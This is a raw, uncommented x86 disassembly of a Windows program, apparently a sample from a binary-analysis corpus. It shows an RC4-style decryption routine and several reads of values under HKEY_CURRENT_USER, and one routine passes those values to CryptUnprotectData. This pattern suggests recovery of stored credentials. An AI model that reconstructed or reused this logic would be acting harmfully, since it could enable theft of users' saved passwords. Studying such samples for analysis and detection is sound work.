mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
mov edx [ ecx + eax + 0x2b8c ]
mov ecx [ ebp - 0x68 ]
call sub_417318
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
push [ ecx + eax + 0x2b8c ]
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
lea eax [ ecx + eax + 0x2b88 ]
push eax
push [ ebp - 0x5c ]
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
mov eax [ ecx + eax + 0x2c88 ]
shl eax 0x4
push eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
lea eax [ ecx + eax + 0x2b98 ]
push eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
lea eax [ ecx + eax + 0x2b88 ]
push eax
call sub_4026b0
add esp 0xc
push 0x10
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
lea eax [ ecx + eax + 0x2b7c ]
mov ecx [ ebp - 0x28 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x68 ]
mov ecx [ edx + ecx + 0x2c88 ]
dec ecx
shl ecx 0x4
lea eax [ eax + ecx + 0xc ]
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
mov eax [ ecx + eax + 0x2c88 ]
dec eax
mov ecx [ ebp - 0x28 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x68 ]
mov [ edx + ecx + 0x2c88 ] eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
mov eax [ ecx + eax + 0x2c88 ]
shl eax 0x4
push eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
lea eax [ ecx + eax + 0x2b98 ]
push eax
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
lea eax [ ecx + eax + 0x2b88 ]
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
lea eax [ ecx + eax + 0x2b7c ]
mov ecx [ ebp - 0x28 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x68 ]
mov ecx [ edx + ecx + 0x2c88 ]
shl ecx 0x4
and [ eax + ecx + 0xc ] 0x0
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
lea eax [ ecx + eax + 0x2b7c ]
mov ecx [ ebp - 0x28 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x68 ]
mov ecx [ edx + ecx + 0x2c88 ]
shl ecx 0x4
and [ eax + ecx + 0x10 ] 0x0
mov eax [ ebp - 0x28 ]
imul eax eax 0x118
mov ecx [ ebp - 0x68 ]
lea eax [ ecx + eax + 0x2b7c ]
mov ecx [ ebp - 0x28 ]
imul ecx ecx 0x118
mov edx [ ebp - 0x68 ]
mov ecx [ edx + ecx + 0x2c88 ]
shl ecx 0x4
and [ eax + ecx + 0x14 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x68 ]
add edx 0x5718
mov ecx [ ebp - 0x68 ]
call sub_410c93
mov [ ebp - 0x5f ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x20 ]
call sub_4010a3
mov al [ ebp - 0x5f ]
jmp r-xdata
sub_4180ff
push ebp
mov ebp esp
sub esp 0x11c
mov [ ebp - 0x11c ] edx
mov [ ebp - 0x118 ] ecx
cmp [ ebp - 0x11c ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x8 ] 0x1
jg r-xdata
leave
retn 0x10
mov [ ebp - 0xe ] 0x0
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x102 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
cmp [ ebp - 0x8 ] 0x100
jge r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
inc eax
and eax 0x800000ff
jns r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x0
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov cl [ ebp - 0x8 ]
mov [ eax + 0x2 ] cl
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx ] al
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
mov ecx [ ebp - 0x4 ]
movzx eax [ ecx + eax + 0x2 ]
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx + 0x1 ]
add eax ecx
and eax 0x800000ff
jns r-xdata
dec eax
or eax 0xffffff00
inc eax
cmp [ ebp - 0x8 ] 0x100
jge r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x1 ] al
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov ecx [ ebp - 0x4 ]
lea eax [ ecx + eax + 0x2 ]
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
mov ecx [ ebp - 0x4 ]
lea eax [ ecx + eax + 0x2 ]
push eax
call sub_40101d
pop ecx
pop ecx
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
mov ecx [ ebp - 0x4 ]
movzx eax [ ecx + eax + 0x2 ]
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx + 0x1 ]
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + ecx + 0x2 ]
add eax ecx
and eax 0x800000ff
jns r-xdata
dec eax
or eax 0xffffff00
inc eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x102 ] 0x1
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + eax ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0x8 ]
movzx ecx [ ecx + 0x2 ]
add eax ecx
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx + 0x1 ]
add eax ecx
and eax 0x800000ff
jns r-xdata
mov [ ebp - 0x111 ] al
movzx eax [ ebp - 0x111 ]
mov ecx [ ebp - 0x4 ]
movzx eax [ ecx + eax + 0x2 ]
mov ecx [ ebp - 0x11c ]
add ecx [ ebp - 0x8 ]
movzx ecx [ ecx ]
xor ecx eax
mov eax [ ebp - 0x11c ]
add eax [ ebp - 0x8 ]
mov [ eax ] cl
jmp r-xdata
dec eax
or eax 0xffffff00
inc eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x1 ] al
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov ecx [ ebp - 0x4 ]
lea eax [ ecx + eax + 0x2 ]
push eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ ecx + eax + 0x2 ]
push eax
call sub_40101d
pop ecx
pop ecx
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
inc eax
cdq
idiv [ ebp + 0x10 ]
mov eax [ ebp - 0x4 ]
mov [ eax ] dl
jmp r-xdata
dec eax
or eax 0xffffff00
inc eax
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
sub_4182f9
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x8 ] 0x1
jg r-xdata
leave
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_4180ff
sub_41832f
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx rw-data
call sub_4011f7
cmp [ ebp - 0x8 ] eax
jge r-xdata
xor eax eax
push [ ebp - 0x8 ]
mov ecx rw-data
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
push [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0x100 ]
je r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x6
jne r-xdata
leave
retn
sub_418396
push ebp
mov ebp esp
push 0xffffffff
push sub_423958
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
lea ecx [ ebp - 0x20 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x2c ] 0x0
jmp r-xdata
mov ecx rw-data
call sub_4011f7
cmp [ ebp - 0x2c ] eax
jge r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x20 ]
call sub_4010a3
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
push [ ebp - 0x2c ]
mov ecx rw-data
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push [ eax + 0x20 ]
call [ CoTaskMemFree@IAT ]
and [ ebp - 0x30 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x10
call sub_4011f7
cmp [ ebp - 0x30 ] eax
jge r-xdata
push 0x0
mov ecx [ ebp - 0x10 ]
call sub_402623
mov edx [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
jmp r-xdata
push [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
add ecx 0x10
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
push [ eax + 0x20 ]
call [ CoTaskMemFree@IAT ]
and [ ebp - 0x34 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x2c ]
inc eax
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x28 ]
add ecx 0x10
call sub_4011f7
cmp [ ebp - 0x34 ] eax
jge r-xdata
push 0x0
mov ecx [ ebp - 0x28 ]
call sub_402623
mov edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
jmp r-xdata
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x28 ]
add ecx 0x10
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
push [ eax ]
call [ CoTaskMemFree@IAT ]
mov eax [ ebp - 0x24 ]
push [ eax + 0x4 ]
call [ CoTaskMemFree@IAT ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
jmp r-xdata
mov eax [ ebp - 0x30 ]
inc eax
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x34 ]
inc eax
mov [ ebp - 0x34 ] eax
sub_4184db
push ebp
mov ebp esp
push 0xffffffff
push sub_423a63
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x5c
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x44 ] eax
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x40 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
mov [ ebp - 0x28 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push r--data
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x61 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_4010a3
mov al [ ebp - 0x61 ]
jmp r-xdata
push r--data
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x10 ] 0x6
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
push r--data
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
push [ ebp - 0x44 ]
call sub_41832f
add esp 0xc
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push r--data
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
mov [ ebp - 0x2d ] 0x0
cmp [ ebp - 0x10 ] 0x6
jne r-xdata
mov edx 0x608
mov ecx [ ebp - 0x44 ]
call sub_417318
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push r--data
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x10 ] 0x4
jmp r-xdata
push r--data
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
call sub_4134ac
movzx eax al
test eax eax
jne r-xdata
mov [ ebp - 0x2d ] 0x1
push 0x100
push [ ebp + 0x8 ]
push [ ebp - 0x14 ]
call [ lstrcpynW@IAT ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x100 ] ecx
mov edx [ ebp - 0x14 ]
mov ecx rw-data
call sub_401cb4
mov [ ebp - 0x63 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_4010a3
mov al [ ebp - 0x63 ]
jmp r-xdata
mov [ ebp - 0x62 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_4010a3
mov al [ ebp - 0x62 ]
jmp r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
mov [ ebp - 0x2d ] 0x1
push r--data
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
call sub_4134ac
movzx eax al
test eax eax
jne r-xdata
cmp [ ebp - 0x10 ] 0x6
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx 0x80000001
mov ecx [ ebp - 0x44 ]
call sub_41017c
cmp [ ebp - 0x18 ] 0x0
jle r-xdata
push r--data
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
push r--data
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
and [ ebp - 0x60 ] 0x0
jmp r-xdata
push 0x1
push [ ebp - 0x18 ]
lea ecx [ ebp - 0x40 ]
call sub_4105e1
movzx eax al
test eax eax
je r-xdata
movzx eax [ ebp - 0x2d ]
test eax eax
je r-xdata
push r--data
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
push 0x100
push [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
add eax 0x208
push eax
call [ lstrcpynW@IAT ]
jmp r-xdata
mov ecx rw-data
call sub_4011f7
cmp [ ebp - 0x60 ] eax
jge r-xdata
lea ecx [ ebp - 0x40 ]
call sub_40100f
mov [ ebp - 0x28 ] eax
lea ecx [ ebp - 0x40 ]
call sub_401000
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x40 ]
call sub_40100f
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx 0x80000001
mov ecx [ ebp - 0x44 ]
call sub_41017c
push 0x0
lea ecx [ ebp - 0x40 ]
call sub_410af3
lea ecx [ ebp - 0x40 ]
call sub_40100f
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x50 ] eax
and [ ebp - 0x20 ] 0x0
and [ ebp - 0x24 ] 0x0
cmp [ ebp - 0x18 ] 0x2
jle r-xdata
push r--data
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
push r--data
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
call sub_4134ac
movzx eax al
test eax eax
jne r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ rw-data ]
je r-xdata
jmp r-xdata
push [ ebp - 0x60 ]
mov ecx rw-data
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
push [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x44 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
push 0x0
lea ecx [ ebp - 0x40 ]
call sub_40100f
mov edx eax
mov ecx [ ebp - 0x44 ]
call sub_413434
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
movzx eax [ eax ]
cmp eax 0x201
jne r-xdata
push 0x100
push [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
add eax 0x408
push eax
call [ lstrcpynW@IAT ]
push 0x100
push [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
add eax 0x308
push eax
call [ lstrcpynW@IAT ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x204 ] 0x0
jne r-xdata
mov edx [ ebp - 0x28 ]
mov ecx [ ebp - 0x44 ]
call sub_417232
jmp r-xdata
mov eax [ ebp - 0x14 ]
movzx eax [ eax + 0x104 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x28 ]
inc eax
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2d ] 0x0
and [ ebp - 0x54 ] 0x0
jmp r-xdata
mov [ ebp - 0x64 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_4010a3
mov al [ ebp - 0x64 ]
mov [ ebp - 0x18 ] 0x4
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x100 ]
mov [ ebp - 0x68 ] eax
cmp [ ebp - 0x68 ] 0x1
je r-xdata
mov eax [ ebp - 0x60 ]
inc eax
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x14 ]
add eax 0x104
push eax
call [ lstrlenW@IAT ]
cmp eax 0x54
jge r-xdata
push 0x100
push [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
add eax 0x104
push eax
call [ lstrcpynW@IAT ]
jmp r-xdata
mov ecx rw-data
call sub_4011f7
cmp [ ebp - 0x54 ] eax
jge r-xdata
mov [ ebp - 0x28 ] r--data
jmp r-xdata
cmp [ ebp - 0x68 ] 0x2
je r-xdata
push r--data
mov eax [ ebp - 0x14 ]
add eax 0x104
push eax
call [ lstrcatW@IAT ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
add eax 0x104
push eax
call [ lstrcatW@IAT ]
movzx eax [ ebp - 0x2d ]
test eax eax
jne r-xdata
push [ ebp - 0x54 ]
mov ecx rw-data
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x1c ] eax
and [ ebp - 0x58 ] 0x0
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
add eax 0x204
push eax
push [ ebp - 0x28 ]
push [ ebp + 0x8 ]
mov edx 0x80000001
mov ecx [ ebp - 0x44 ]
call sub_41017c
mov [ ebp - 0x28 ] r--data
jmp r-xdata
cmp [ ebp - 0x68 ] 0x4
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x1c ]
add ecx 0x10
call sub_4011f7
cmp [ ebp - 0x58 ] eax
jge r-xdata
mov [ ebp - 0x28 ] r--data
jmp r-xdata
jmp r-xdata
jmp r-xdata
push [ ebp - 0x58 ]
mov ecx [ ebp - 0x1c ]
add ecx 0x10
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x48 ] eax
and [ ebp - 0x5c ] 0x0
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x54 ]
inc eax
mov [ ebp - 0x54 ] eax
mov ecx [ ebp - 0x48 ]
add ecx 0x10
call sub_4011f7
cmp [ ebp - 0x5c ] eax
jge r-xdata
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx [ ebp - 0x48 ]
add ecx 0x10
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
push [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
push [ eax ]
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x58 ]
inc eax
mov [ ebp - 0x58 ] eax
jmp r-xdata
push 0x0
mov eax [ ebp - 0x2c ]
push [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x44 ]
call sub_414855
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2d ] 0x1
mov ecx [ ebp - 0x48 ]
add ecx 0x10
call sub_4011f7
mov [ ebp - 0x5c ] eax
mov ecx [ ebp - 0x1c ]
add ecx 0x10
call sub_4011f7
mov [ ebp - 0x58 ] eax
mov ecx rw-data
call sub_4011f7
mov [ ebp - 0x54 ] eax
jmp r-xdata
mov eax [ ebp - 0x5c ]
inc eax
mov [ ebp - 0x5c ] eax
sub_418ab1
push ebp
mov ebp esp
push 0xffffffff
push sub_423a75
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
lea ecx [ ebp - 0x1c ]
call sub_401068
and [ ebp - 0x4 ] 0x0
push 0x8
push 0x0
lea eax [ ebp - 0x24 ]
push eax
call sub_4031e0
add esp 0xc
mov ecx rw-data
call sub_4011f7
sub eax [ rw-data ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_410af3
mov eax [ rw-data ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov ecx rw-data
call sub_4011f7
cmp [ ebp - 0x2c ] eax
jge r-xdata
mov ecx rw-data
call sub_401ca3
lea ecx [ ebp - 0x1c ]
call sub_401000
push eax
push 0x0
push 0x3c
mov ecx [ ebp + 0x8 ]
call sub_413b96
push eax
push 0x0
push 0x80760001
lea ecx [ ebp - 0x1c ]
call sub_401000
push eax
lea ecx [ ebp - 0x1c ]
call sub_40100f
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_41578c
mov [ ebp - 0x2d ] al
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov al [ ebp - 0x2d ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
push [ ebp - 0x2c ]
mov ecx rw-data
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
jmp r-xdata
push [ ebp - 0x28 ]
call [ lstrlenW@IAT ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x2c ]
inc eax
mov [ ebp - 0x2c ] eax
push [ ebp - 0x28 ]
lea ecx [ ebp - 0x1c ]
call sub_401345
push 0x0
push 0x8
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_410811
sub_418bce
push ebp
mov ebp esp
sub esp 0x3c
mov ecx rw-data
call sub_401ca3
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
mov ecx rw-data
call sub_401cb4
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov eax [ rw-data ]
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
leave
retn
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push [ ebp - 0x4 ]
call [ eax + 0x1c ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push [ ebp - 0x4 ]
call [ eax + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push [ ebp - 0x8 ]
call [ eax + 0x14 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push [ ebp - 0x8 ]
call [ eax + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push 0x1
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push [ ebp - 0x8 ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
cmp [ ebp - 0x38 ] 0x0
je r-xdata
cmp [ ebp - 0x34 ] 0x0
je r-xdata
push 0x0
mov edx [ ebp - 0x38 ]
mov ecx [ ebp + 0x8 ]
call sub_413434
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
jmp r-xdata
push [ ebp - 0x34 ]
call [ CoTaskMemFree@IAT ]
push [ ebp - 0x38 ]
call [ CoTaskMemFree@IAT ]
mov edx [ ebp - 0x10 ]
mov ecx rw-data
call sub_401cb4
sub_418cd6
push ebp
mov ebp esp
push 0xffffffff
push sub_423b8a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4c ] eax
lea ecx [ ebp - 0x40 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x2c ] 0x0
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx 0x80000001
mov ecx [ ebp - 0x4c ]
call sub_41017c
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x62 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_4010a3
mov al [ ebp - 0x62 ]
jmp r-xdata
push 0x0
push [ ebp - 0x2c ]
lea ecx [ ebp - 0x40 ]
call sub_4105e1
movzx eax al
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
mov [ ebp - 0x61 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_4010a3
mov al [ ebp - 0x61 ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x40 ]
call sub_40100f
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx 0x80000001
mov ecx [ ebp - 0x4c ]
call sub_41017c
movzx eax al
test eax eax
jne r-xdata
jmp r-xdata
lea ecx [ ebp - 0x40 ]
call sub_40100f
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x48 ] eax
and [ ebp - 0x5c ] 0x0
jmp r-xdata
mov ecx rw-data
call sub_4011f7
cmp [ ebp - 0x5c ] eax
jge r-xdata
mov [ ebp - 0x63 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_4010a3
mov al [ ebp - 0x63 ]
push [ ebp - 0x5c ]
mov ecx rw-data
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x80 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
push [ eax + 0x80 ]
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x28 ]
push eax
push 0x1
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea eax [ ebp - 0x48 ]
push eax
call [ CryptUnprotectData@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x5c ]
inc eax
mov [ ebp - 0x5c ] eax
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x58 ]
cmp [ eax + 0xc ] 0x4b434957
je r-xdata
mov eax [ ebp - 0x58 ]
mov eax [ eax ]
mov ecx [ ebp - 0x58 ]
add eax [ ecx + 0x8 ]
mov ecx [ ebp - 0x58 ]
add eax [ ecx + 0x4 ]
cmp [ ebp - 0x28 ] eax
jb r-xdata
